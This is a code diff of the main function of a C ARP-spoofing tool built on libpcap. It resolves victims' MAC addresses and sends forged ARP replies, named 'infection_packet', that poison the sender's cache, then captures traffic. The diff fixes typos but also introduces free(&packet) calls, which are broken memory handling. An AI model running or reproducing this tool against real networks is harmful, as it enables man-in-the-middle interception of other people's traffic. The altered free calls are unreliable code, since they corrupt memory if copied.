@@ -37,8 +37,8 @@ int main(int argc, char* argv[])
     //retype ip address.
     for(i = 2; i < argc; i += 2)
     {
-    	ip_retype(argv[i],sessions[(i / 2) - 1].sender_ip);
-    	ip_retype(argv[i + 1],sessions[(i / 2) - 1].target_ip);
+        ip_retype(argv[i],&sessions[(i / 2) - 1].sender_ip);
+        ip_retype(argv[i + 1],&sessions[(i / 2) - 1].target_ip);
     	printf("[+] %d : sender ip : %8x\n", i / 2, sessions[((i / 2) - 1)].sender_ip);
     	printf("[+] %d : target ip : %8x\n", i / 2, sessions[((i / 2) - 1)].target_ip);
     }
@@ -50,7 +50,7 @@ int main(int argc, char* argv[])
     //get all sessions sender mac address.
     for(i = 0; i < (argc - 2) / 2; i++)
     {
-    	packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].sender_ip)
+        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, &zero_ip, zero_mac, &sessions[i].sender_ip);
     	pcap_sendpacket(handle, packet, 42);
     	while(true)
     	{
@@ -71,7 +71,7 @@ int main(int argc, char* argv[])
             	}
             	break;
         	}
-       	free(packet);
+        free(&packet);
         free(eth);
         free(arp);
     	}
@@ -80,7 +80,7 @@ int main(int argc, char* argv[])
     //get all sessions target mac address.
     for(i = 0; i < (argc - 2) / 2; i++)
     {
-    	packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, zero_ip, zero_mac, sessions[i].target_ip)
+        packet = make_arp(REQUEST, attacker_mac, broadcast_mac, attacker_mac, &zero_ip, zero_mac, &sessions[i].target_ip);
     	pcap_sendpacket(handle, packet, 42);
     	while(true)
     	{
@@ -101,7 +101,7 @@ int main(int argc, char* argv[])
             	}
             	break;
         	}
-        free(packet);
+        free(&packet);
         free(eth);
         free(arp);
     	}
@@ -109,14 +109,14 @@ int main(int argc, char* argv[])
 
     for(i = 0; i < (argc - 2) / 2; i++)
     {
-    	infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].sender_mac, attacker_mac, sessions[i].target_ip, sessions[i].sender_mac, sessions[i].sender_ip);
+        infection_packet[i] = make_arp(REPLY, attacker_mac, sessions[i].sender_mac, attacker_mac, &sessions[i].target_ip, sessions[i].sender_mac, &sessions[i].sender_ip);
     	pcap_sendpacket(handle, infection_packet[i], 42);
     	printf("[+] infection_packet for session no.%d is sendedn", i);
     }
 
     while(true)
     {
-    	res = pcap_net_ex(handle, &header, &packet);
+        res = pcap_next_ex(handle, &header, &packet);
     	if (res == 0)
     		continue;
     	if (res == -1 || res == -2)
